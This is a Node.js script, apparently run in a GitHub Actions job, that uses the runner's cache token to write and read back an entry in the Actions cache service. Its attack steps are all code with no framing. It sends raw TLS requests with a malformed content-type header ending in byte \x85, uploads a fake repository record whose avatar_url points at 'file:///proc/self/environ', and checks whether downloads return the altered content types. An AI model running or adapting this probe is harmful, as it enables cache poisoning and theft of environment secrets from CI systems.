import tls from 'node:tls';
import {createHash} from 'node:crypto';

const results = process.env.ACTIONS_RESULTS_URL;
const token = process.env.ACTIONS_RUNTIME_TOKEN;
const runId = process.env.GITHUB_RUN_ID;
const key = `cassette-key-${runId}`;
const version = createHash('sha256').update(`version-${runId}`).digest('hex');
const P = Buffer.from(JSON.stringify({
  full_name: 'x/cache-carrier', owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
  description: 'cachev2', stargazers_count: 0,
}));

function twirp(method, body) {
  return fetch(new URL(`/twirp/github.actions.results.api.v1.CacheService/${method}`, results), {
    method: 'POST',
    headers: {authorization: `Bearer ${token}`, 'content-type': 'application/json', accept: 'application/json'},
    body: JSON.stringify(body),
  }).then(async (r) => ({status: r.status, text: await r.text()})).catch((e) => ({err: String(e)}));
}

function rawTls(urlStr, method, headerLines, body) {
  const u = new URL(urlStr);
  return new Promise((resolve, reject) => {
    const socket = tls.connect({host: u.hostname, port: Number(u.port || 443), servername: u.hostname, ALPNProtocols: ['http/1.1']});
    socket.setTimeout(30000);
    const chunks = [];
    socket.once('secureConnect', () => {
      const lines = [`${method} ${u.pathname}${u.search} HTTP/1.1`, `Host: ${u.host}`, ...headerLines, 'Connection: close', '', ''];
      socket.write(Buffer.concat([Buffer.from(lines.join('\r\n'), 'latin1'), body || Buffer.alloc(0)]));
    });
    socket.on('data', (c) => chunks.push(c));
    socket.once('error', reject);
    socket.once('timeout', () => socket.destroy(new Error('timeout')));
    socket.once('end', () => {
      const raw = Buffer.concat(chunks);
      const idx = raw.indexOf('\r\n\r\n');
      if (idx < 0) return resolve({status: null, head: raw.toString('latin1'), body: Buffer.alloc(0), cts: []});
      const head = raw.subarray(0, idx).toString('latin1');
      const status = Number((head.split('\r\n')[0] || '').split(' ')[1]);
      const bodyOut = raw.subarray(idx + 4);
      const cts = [];
      for (const line of head.split('\r\n').slice(1)) {
        const p = line.indexOf(':');
        if (p < 0) continue;
        if (line.slice(0, p).toLowerCase() === 'content-type') cts.push(Buffer.from(line.slice(p + 1).trim(), 'latin1').toString('hex'));
      }
      resolve({status, head, body: bodyOut, cts});
    });
  });
}

const out = {key, version, resultsHost: (() => { try { return new URL(results).host; } catch { return null; } })()};
try {
  const created = await twirp('CreateCacheEntry', {key, version});
  out.create = created;
  let json = null;
  try { json = JSON.parse(created.text); } catch {}
  const uploadUrl = json && (json.signedUploadUrl || json.signed_upload_url);
  out.uploadUrlHost = uploadUrl ? new URL(uploadUrl).host : null;
  out.uploadUrlKeys = uploadUrl ? [...new URL(uploadUrl).searchParams.keys()].sort() : null;
  if (uploadUrl) {
    const up = await rawTls(uploadUrl, 'PUT', [
      'x-ms-blob-type: BlockBlob',
      'x-ms-blob-content-type: application/json\x85',
      'Content-Type: application/octet-stream',
      `Content-Length: ${P.length}`,
    ], P);
    out.upload = {status: up.status, err: up.status !== 201 ? Buffer.from(up.body.subarray(0, 300)).toString('utf8') : undefined};
    const fin = await twirp('FinalizeCacheEntryUpload', {key, version, sizeBytes: String(P.length)});
    out.finalize = fin;
    const dl = await twirp('GetCacheEntryDownloadURL', {key, version});
    out.download = dl;
    let dj = null;
    try { dj = JSON.parse(dl.text); } catch {}
    const dlUrl = dj && (dj.signedDownloadUrl || dj.signed_download_url);
    out.dlUrlHost = dlUrl ? new URL(dlUrl).host : null;
    out.dlUrlKeys = dlUrl ? [...new URL(dlUrl).searchParams.keys()].sort() : null;
    out.dlUrl = dlUrl ? dlUrl.slice(0, 260) : null;
    if (dlUrl) {
      const asIs = await rawTls(dlUrl, 'GET', ['User-Agent: cachev2'], null);
      out.asIs = {status: asIs.status, ctHex: asIs.cts, bodyMatch: asIs.body.equals(P)};
      const old = await rawTls(dlUrl + '&api-version=2012-02-12', 'GET', ['User-Agent: cachev2'], null);
      out.old = {status: old.status, ctHex: old.cts, bodyMatch: old.body.equals(P)};
    }
  }
} catch (e) {
  out.err = String(e).slice(0, 400);
}
console.log('CACHEV2', JSON.stringify(out));
